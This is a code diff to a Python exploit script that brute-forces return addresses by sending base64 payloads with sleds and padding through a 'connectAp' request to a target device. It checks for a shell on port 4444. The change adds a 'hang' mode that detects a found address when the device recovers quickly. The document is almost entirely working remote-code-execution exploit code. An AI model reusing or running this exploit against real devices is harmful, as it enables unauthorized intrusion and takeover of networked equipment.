@@ -176,7 +176,7 @@ def main():
                 open(idx, "w").write(str(i))
             b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
                         prefix=a.prefix.encode(), sledfill=a.sledfill, units=a.units,
-                        pcround=a.pcround)
+                        pcround=a.pcround, hang=a.hang)
             params = connect_params(b64, a.ssid, a.bssid)
             t0 = time.time()
             r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
@@ -189,7 +189,12 @@ def main():
                 if p.returncode == 0:
                     print("SHELL on %s:4444" % a.host)
                     break
+                t = time.time()
                 sess = login(a.host, tries=600)
+                if a.hang and time.time() - t < 15:
+                    print("HANG at %#x (recovered in %.1fs) — address found"
+                          % (candidate, time.time() - t), flush=True)
+                    break
         return
 
     b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare,
